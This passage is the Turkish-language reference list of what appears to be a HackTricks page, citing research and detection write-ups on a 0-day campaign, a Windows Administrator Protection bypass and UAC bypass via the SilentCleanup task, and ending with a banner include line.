- [6] [Check Point Research – Operation TrueChaos: Güneydoğu Asya'daki hükümet hedeflerine karşı 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection'ı Bypass Etme](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task kullanarak UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
